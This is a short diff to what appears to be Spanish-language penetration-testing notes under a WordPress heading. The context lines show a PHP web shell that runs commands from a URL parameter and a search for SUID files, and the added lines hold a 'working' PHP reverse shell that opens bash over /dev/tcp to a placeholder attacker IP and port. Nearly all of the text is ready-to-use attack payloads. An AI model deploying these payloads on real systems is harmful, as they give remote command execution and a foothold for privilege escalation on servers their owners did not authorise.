@@ -99,6 +99,12 @@ Wordpress
 		if($_GET['cmd']) {
 		  system($_GET['cmd']);
 		  }
+		  
+		  
+SHELL PHP FUNCIONAL
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/IP-NUESTRA/PUERTO-NUESTRO 0>&1'");
+ ?>
 
 find / -perm -4000 -ls 2> /dev/null // Para buscar ficheros con SUID activado
 
